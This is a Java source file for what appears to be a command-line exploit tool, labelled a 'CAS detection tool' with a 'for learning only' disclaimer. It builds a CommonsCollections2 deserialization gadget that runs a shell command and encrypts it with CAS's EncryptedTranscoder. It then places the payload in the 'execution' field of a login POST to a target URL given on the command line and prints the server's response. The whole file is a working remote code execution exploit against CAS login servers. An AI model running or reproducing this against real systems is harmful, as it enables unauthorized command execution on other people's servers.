package maoge.cas;

import org.apache.http.HttpEntity;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;
import maoge.cas.payloads.ObjectPayload;

import java.io.*;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class AESBase64 {


    private static PoolingHttpClientConnectionManager connMgr;
    private static RequestConfig requestConfig;
    private static final int MAX_TIMEOUT = 7000;

    static {
        connMgr = new PoolingHttpClientConnectionManager();
        connMgr.setMaxTotal(100);
        connMgr.setDefaultMaxPerRoute(connMgr.getMaxTotal());
        RequestConfig.Builder configBuilder = RequestConfig.custom();
        configBuilder.setConnectTimeout(MAX_TIMEOUT);
        configBuilder.setSocketTimeout(MAX_TIMEOUT);
        configBuilder.setConnectionRequestTimeout(MAX_TIMEOUT);
        configBuilder.setStaleConnectionCheckEnabled(true);
        requestConfig = configBuilder.build();
    }

    public static String cmd ="ls";
    public static void main(String args[]) throws IOException {
        System.out.println("-----------------------cas检测工具---------------------------------");
        System.out.println("-----------本软件仅供学习交流,如作他用所承受的法律责任一概与作者无关---------");
        System.out.println(
                "* *\t\t  * *\n" +
                "*  *\t *   *\n" +
                "*   *\t*   *\n" +
                "*\t * *    *\n" +
                "*  *  *  * *\n" +
                "*\t        *\n" +
                "*          *\n" +
                "*          *");
        System.out.println("---------use: jar -jar cas-0.0.1-all.jar http://xxxx.xxxx-------");
        System.out.println("-------------------create by maobugs----------------------------");
        System.out.println("执行命令whoami...");
        if(args.length<1){
            System.out.println("----------use: jar -jar cas.jar http://xxxx.xxxx----------------");
            return;
        }
        String url = args[0].trim();
        String[] https = url.split(":");
        String http = https[0].trim();
        final BASE64Encoder encoder = new BASE64Encoder();
        String poc[] = {"CommonsCollections2","whoami"};
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], cmd);
        EncryptedTranscoder et = new EncryptedTranscoder();
        byte[] encode = et.encode(payloadObject);
        String bbb = encoder.encode(encode);
        System.out.println("payload is: "+bbb);
        Map map = new HashMap();
        map.put("username","13222233322");
        map.put("password","Test1234");
        map.put("lt","LT-215706-O4ejY5ldDQpHMB9WdQbe0trNaM28Wf-cas01.example.org");
        map.put("execution","7b951c2a-e78f-4286-95fe-970782352a84_"+bbb);
        map.put("_eventId","submit");
        String result = "执行结果是：";
        if("http".equals(http)){
            System.out.println(result+doPost(url,map));
            return;
        }else if("https".equals(https[0].trim())){
            System.out.println(result+doPostSSL(url,map));
            return;
        }else{
            System.out.println("协议不正确");
            return;
        }
    }

    //http
    public static String doPost(String apiUrl, Map<String, Object> params) {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        String httpStr = "";
        HttpPost httpPost = new HttpPost(apiUrl);
        CloseableHttpResponse response = null;

        try {
            httpPost.setConfig(requestConfig);
            List<NameValuePair> pairList = new ArrayList<NameValuePair>(params.size());
            for (Map.Entry<String, Object> entry : params.entrySet()) {
                NameValuePair pair = new BasicNameValuePair(entry.getKey(), entry.getValue().toString());
                pairList.add(pair);
            }
            httpPost.setEntity(new UrlEncodedFormEntity(pairList, Charset.forName("UTF-8")));
            response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            byte[] bytes = new byte[100];
            for(;;){
                if(-1!=entity.getContent().read(bytes)){
                    httpStr += new String(bytes);
                }else{
                    break;
                }
            }
        } catch (IOException e) {
        } finally {
            if (response != null) {
                try {
                    EntityUtils.consume(response.getEntity());
                } catch (IOException e) {
                }
            }
        }
        return httpStr;
    }

    //https
    public static String doPostSSL(String apiUrl, Map<String, Object> params){
        HttpPost httpPost = new HttpPost(apiUrl);
        CloseableHttpResponse response = null;
        String httpStr = "";
        SSLClient httpClient = null;
        try {
            httpClient = new SSLClient();
            httpPost.setConfig(requestConfig);
            List<NameValuePair> pairList = new ArrayList<NameValuePair>(params.size());
            for (Map.Entry<String, Object> entry : params.entrySet()) {
                NameValuePair pair = new BasicNameValuePair(entry.getKey(), entry.getValue().toString());
                pairList.add(pair);
            }
            httpPost.setEntity(new UrlEncodedFormEntity(pairList, Charset.forName("utf-8")));
            response = httpClient.execute(httpPost);
            int statusCode = response.getStatusLine().getStatusCode();
            if (statusCode != HttpStatus.SC_OK) {
                System.out.println("请求结果错误");
                return null;
            }
            HttpEntity entity = response.getEntity();
            if (entity == null) {
                return null;
            }
            byte[] bytes = new byte[100];
            for(;;){
                if(-1!=entity.getContent().read(bytes)){
                    httpStr += new String(bytes);
                }else{
                    break;
                }
            }
        } catch (Exception e) {

        } finally {
            if (response != null) {
                try {
                    EntityUtils.consume(response.getEntity());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return httpStr;
    }

}
